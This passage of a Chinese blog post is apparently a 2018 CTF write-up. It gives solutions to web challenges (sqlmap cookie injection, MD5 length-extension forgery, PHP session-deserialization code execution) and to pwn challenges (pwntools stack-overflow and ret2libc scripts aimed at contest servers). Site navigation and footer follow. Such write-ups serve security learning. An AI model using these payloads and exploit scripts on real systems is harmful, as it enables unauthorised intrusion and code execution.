+<p>解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">echo &quot;&lt;center&gt;&lt;font size=&apos;5&apos; color=&apos;red&apos;&gt;&quot;;</span><br><span class="line">echo &quot;You wanna capture this flag?&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;Oh yes, here!&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;But now, &quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;Get out!&quot;;</span><br><span class="line">echo &quot;&lt;/font&gt;&lt;/center&gt;&quot;;</span><br><span class="line">//flag: D0g3&#123;Hi_D0g3_Res3t_4nd_xXe&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="simple-sqli"><a href="#simple-sqli" class="headerlink" title="simple sqli"></a>simple sqli</h3><p>一开始以为是二次注入，因为注册一个test’，登录后会报错。后面发现是cookie注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt --cookie &quot;PHPSESSID=p6364j7vahfs88uiesq03g1e25;uname=1&quot; --dbms mysql --level 2 --tamper base64encode,charencode --sql-shell</span><br></pre></td></tr></table></figure>
+<p>当时进入了sql-shell，但是马上时间截止了，很慌就没来得及找web路径，赛后发现有phpinfo</p>
+<p>直接读取flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;/www/sqli/secret.php&apos;)</span><br></pre></td></tr></table></figure>
+<p>base64解码后就是flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3&#123;iaown_oiasnd_asdasda&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash!!!"></a>Hash!!!</h3><p>响应头的source改为1就能拿到核心源码，可以看到是cbc翻转攻击，利用hashpump来构造poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(0);</span><br><span class="line"></span><br><span class="line">$flag = &quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;;</span><br><span class="line">$secret_key = &quot;xxxxxxxxxxxxxxxxxxxxxx&quot;; // the key is safe! no one can know except me</span><br><span class="line"></span><br><span class="line">$username = $_POST[&quot;username&quot;];</span><br><span class="line">$password = $_POST[&quot;password&quot;];</span><br><span class="line">header(&quot;hash_key:&quot; . $hash_key);</span><br><span class="line"></span><br><span class="line">if (!empty($_COOKIE[&quot;getflag&quot;])) &#123;</span><br><span class="line">    if (urldecode($username) === &quot;D0g3&quot; &amp;&amp; urldecode($password) != &quot;D0g3&quot;) &#123;</span><br><span class="line">        if ($COOKIE[&quot;getflag&quot;] === md5($secret_key . urldecode($username . $password))) &#123;</span><br><span class="line">            echo &quot;Great! You&apos;re in!\n&quot;;</span><br><span class="line">            die (&quot;&lt;!-- The flag is &quot;. $flag . &quot;--&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            die (&quot;Go out! Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        die (&quot;LEAVE! You&apos;re not one of us!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(&quot;sample-hash&quot;, md5($secret_key . urldecode(&quot;D0g3&quot; . &quot;D0g3&quot;)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line">if (empty($_COOKIE[&quot;source&quot;])) &#123;</span><br><span class="line">    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;&lt;source_code&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hashpump</span><br><span class="line">Input Signature: c3ef608fdc59d9143c39664ade7556d5</span><br><span class="line">Input Data: D0g3</span><br><span class="line">Input Key Length: 20</span><br><span class="line">Input Data to Add: test</span><br><span class="line">5e38fe415ce2786f4ae79776038f53ee</span><br><span class="line">D0g3\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00test</span><br></pre></td></tr></table></figure>
+<p>将\x改为%，将POST的username改为D0g3，password改为<code>D0g3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00test</code>，cookie加入getflag: 5e38fe415ce2786f4ae79776038f53ee</p>
+<p>拿到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3&#123;h4sh_1s_s0_diffic1ut_t0_me&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="方舟计划"><a href="#方舟计划" class="headerlink" title="方舟计划"></a>方舟计划</h3><p><a href="http://222.18.158.227:10380/index.php" target="_blank" rel="external">http://222.18.158.227:10380/index.php</a><br>又是买彩票。和之前的qctf一样。也是php弱类型的锅。<br>POST传入{“action”:”buy”,”numbers”:[true,true,true,true,true,true,true]}<br>每次都能中$5000000，多买几次就能买flag了。<br>Here is your flag: 想上飞船不仅仅是有钱就够了，你还得有智慧，解出这道题，你就可以获救了：一次RSA密钥对生成中，假设p=473398606，q=451141，e=17 求解出d</p>
+<p>python 已知p,q,e求rsa的d<br><a href="https://blog.csdn.net/zyxyzz/article/details/78205321" target="_blank" rel="external">https://blog.csdn.net/zyxyzz/article/details/78205321</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"># coding = utf-8</span><br><span class="line">def computeD(fn, e):</span><br><span class="line">    (x, y, r) = extendedGCD(fn, e)</span><br><span class="line">    #y maybe &lt; 0, so convert it</span><br><span class="line">    if y &lt; 0:</span><br><span class="line">        return fn + y</span><br><span class="line">    return y</span><br><span class="line">def extendedGCD(a, b):</span><br><span class="line">    #a*xi + b*yi = ri</span><br><span class="line">    if b == 0:</span><br><span class="line">        return (1, 0, a)</span><br><span class="line">    #a*x1 + b*y1 = a</span><br><span class="line">    x1 = 1</span><br><span class="line">    y1 = 0</span><br><span class="line">    #a*x2 + b*y2 = b</span><br><span class="line">    x2 = 0</span><br><span class="line">    y2 = 1</span><br><span class="line">    while b != 0:</span><br><span class="line">        q = a / b</span><br><span class="line">        #ri = r(i-2) % r(i-1)</span><br><span class="line">        r = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = r</span><br><span class="line">        #xi = x(i-2) - q*x(i-1)</span><br><span class="line">        x = x1 - q*x2</span><br><span class="line">        x1 = x2</span><br><span class="line">        x2 = x</span><br><span class="line">        #yi = y(i-2) - q*y(i-1)</span><br><span class="line">        y = y1 - q*y2</span><br><span class="line">        y1 = y2</span><br><span class="line">        y2 = y</span><br><span class="line">    return(x1, y1, a)</span><br><span class="line">p = 473398606</span><br><span class="line">q = 451141</span><br><span class="line">e = 17</span><br><span class="line">n = p * q</span><br><span class="line">fn = (p - 1) * (q - 1)</span><br><span class="line">d = computeD(fn, e)</span><br><span class="line">print d</span><br></pre></td></tr></table></figure></p>
+<p>求得150754621171553<br>D0g3{150754621171553}</p>
+<h3 id="Double-S"><a href="#Double-S" class="headerlink" title="Double-S"></a>Double-S</h3><p>签道题<br><a href="http://54.200.169.99:7000/" target="_blank" rel="external">http://54.200.169.99:7000/</a><br>源码泄露<a href="http://54.200.169.99:7000/www.zip代码审计" target="_blank" rel="external">http://54.200.169.99:7000/www.zip代码审计</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class Anti</span><br><span class="line">&#123;</span><br><span class="line">    public $info;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;info = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;aa&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    if(unserialize($_GET[&apos;aa&apos;])==&apos;phpinfo&apos;)</span><br><span class="line">    &#123;</span><br><span class="line">    	$m = new Anti();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    header(&quot;location:index.html&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p><a href="http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:10:&quot;phpinfo();&quot;;}" target="_blank" rel="external">http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:10:&quot;phpinfo();&quot;;}</a><br>通过phpinfo页面，我们知道php.ini中默认<code>session.serialize_handler</code>为<code>php_serialize</code>，而index.php中将其设置为php。这就导致了seesion的反序列化问题。</p>
+<p>由phpinfo()页面继续可知，<code>session.upload_progress.enabled</code>为On。</p>
+<p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。<br>传入$_SESSION数据的，这里就利用到了反序列化问题。<br>考虑序列化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Anti</span><br><span class="line">&#123;</span><br><span class="line">    public $info=&apos;print_r(scandir(dirname(__FILE__)));&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new Anti();</span><br><span class="line">$a = serialize($obj);</span><br><span class="line">var_dump($a);</span><br><span class="line">?&gt;</span><br><span class="line">O:4:&quot;Anti&quot;:1:&#123;s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><a href="http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}" target="_blank" rel="external">http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</a><br>发现flag文件<a href="http://54.200.169.99:7000/f1ag_i3_h3re" target="_blank" rel="external">http://54.200.169.99:7000/f1ag_i3_h3re</a><br>D0g3{Sim_Pl3_S3sSi0n}</p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="neko"><a href="#neko" class="headerlink" title="neko"></a>neko</h3><p>也是一个栈溢出，有system地址，leak libcbalabalabala。。。。去libcdb查版本，常规操作没啥说的贴个脚本</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">EXE = <span class="string">"./neko"</span></span><br><span class="line">e = ELF(EXE)</span><br><span class="line">libc = e.libc</span><br><span class="line">io = remote(<span class="string">'149.248.7.48'</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">system = e.plt[<span class="string">"system"</span>]</span><br><span class="line">puts = e.plt[<span class="string">"puts"</span>]</span><br><span class="line">puts_got = e.got[<span class="string">"puts"</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"cats?\n"</span>,<span class="string">'y'</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0xd4</span></span><br><span class="line">payload += p32(puts)</span><br><span class="line">payload += p32(<span class="number">0x080486E7</span>)</span><br><span class="line">payload += p32(puts_got)</span><br><span class="line">io.sendafter(<span class="string">"anchovies:\n"</span>,payload)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">base = u32(io.recv(<span class="number">4</span>)) - <span class="number">0x05f140</span></span><br><span class="line">binsh = base + <span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0xd4</span></span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(binsh) * <span class="number">2</span></span><br><span class="line">io.sendafter(<span class="string">"anchovies:\n"</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag: D0g3{Wh0_Doe5n’t_1ik3_k1tt3ns??}</p>
+<h3 id="hiahia"><a href="#hiahia" class="headerlink" title="hiahia"></a>hiahia</h3><p>入门pwn，栈溢出到arg[0]<br>check一下，有NX和canary这是利用前提<br><img src="/2018/11/26/安洵杯writewp/sec.PNG" alt="Alt text"><br>调试一下找到flag和arg[0]的地址算一下偏移直接溢出<br><img src="/2018/11/26/安洵杯writewp/home.PNG" alt="Alt text"><br><img src="/2018/11/26/安洵杯writewp/ctf.PNG" alt="Alt text"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">old_flag_addr = <span class="number">0x4007a8</span></span><br><span class="line">new_flag_addr = <span class="number">0x6007a8</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'149.248.7.48'</span>, <span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please find the flag!"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#payload = "a"*0x218 + p64(new_flag_addr)</span></span><br><span class="line">payload = <span class="string">'a'</span>* <span class="number">360</span> + p64(old_flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">flag = p.recv()</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+<p>flag:D0g3{ccc_y0u_again_hiahiahia_}</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://www.twosmi1e.com">two_smi1e</a>
+            <p>原文链接: <a href="https://www.twosmi1e.com/2018/11/26/安洵杯writewp/">https://www.twosmi1e.com/2018/11/26/安洵杯writewp/</a>
+            <p>发表日期: <a href="https://www.twosmi1e.com/2018/11/26/安洵杯writewp/">November 26th 2018, 9:37:41 pm</a>
+            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/11/20/Linux网络编程基础/" title= Linux网络编程基础 >
+                    <div class="prevTitle">Linux网络编程基础</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:377746574@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/twosmi1e" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">1.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CRC"><span class="toc-number">1.1.</span> <span class="toc-text">CRC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">2.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web1"><span class="toc-number">2.1.</span> <span class="toc-text">web1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#蒙古-Diglett"><span class="toc-number">2.2.</span> <span class="toc-text">蒙古 Diglett</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BOOM-web"><span class="toc-number">2.3.</span> <span class="toc-text">BOOM web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#中国-webN"><span class="toc-number">2.4.</span> <span class="toc-text">中国 webN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web2"><span class="toc-number">2.5.</span> <span class="toc-text">web2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#only-d0g3er-can-see-flag"><span class="toc-number">2.6.</span> <span class="toc-text">only d0g3er can see flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Magic-Mirror"><span class="toc-number">2.7.</span> <span class="toc-text">Magic Mirror</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-sqli"><span class="toc-number">2.8.</span> <span class="toc-text">simple sqli</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash"><span class="toc-number">2.9.</span> <span class="toc-text">Hash!!!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方舟计划"><span class="toc-number">2.10.</span> <span class="toc-text">方舟计划</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Double-S"><span class="toc-number">2.11.</span> <span class="toc-text">Double-S</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">3.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#neko"><span class="toc-number">3.1.</span> <span class="toc-text">neko</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hiahia"><span class="toc-number">3.2.</span> <span class="toc-text">hiahia</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 15
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2018/11/26/安洵杯writewp/" >安洵杯writewp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/20</span><a class="archive-post-title" href= "/2018/11/20/Linux网络编程基础/" >Linux网络编程基础</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href= "/2018/11/07/CTF中的常见PHP漏洞/" >CTF中的常见PHP漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href= "/2018/11/07/计算机网络/" >计算机网络</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span><a class="archive-post-title" href= "/2018/11/01/uint8-t-uint16-t-uint32-t-uint64-t数据类型详解/" >uint8_t / uint16_t / uint32_t /uint64_t数据类型详解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/11</span><a class="archive-post-title" href= "/2018/10/11/phpmyadmin-getshell姿势/" >phpmyadmin getshell姿势</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href= "/2018/10/04/WampServer多端口配置/" >WampServer多端口配置</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/06</span><a class="archive-post-title" href= "/2018/09/06/密码学/" >密码学</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/2018/08/18/Crypto中RSA题目总结/" >Crypto中RSA题目总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span><a class="archive-post-title" href= "/2018/08/03/CTF中遇到的隐写术总结/" >CTF中遇到的隐写术总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/15</span><a class="archive-post-title" href= "/2018/07/15/SCTF-writeup/" >SCTF writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/01</span><a class="archive-post-title" href= "/2018/07/01/ISCC-writeup/" >ISCC writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/10</span><a class="archive-post-title" href= "/2018/02/10/Mysql写入文件小技巧/" >Mysql写入文件小技巧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/02</span><a class="archive-post-title" href= "/2018/02/02/Python高级特性/" >Python高级特性</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href= "/2017/10/28/纪念我逝去的青春/" >纪念我逝去的青春</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+    
+        <span class="sidebar-tag-name" data-tags="学习笔记"><span class="iconfont-archer">&#xe606;</span>学习笔记</span>
+    
+        <span class="sidebar-tag-name" data-tags="wp"><span class="iconfont-archer">&#xe606;</span>wp</span>
+    
+        <span class="sidebar-tag-name" data-tags="编程相关"><span class="iconfont-archer">&#xe606;</span>编程相关</span>
+    
+        <span class="sidebar-tag-name" data-tags="随笔"><span class="iconfont-archer">&#xe606;</span>随笔</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
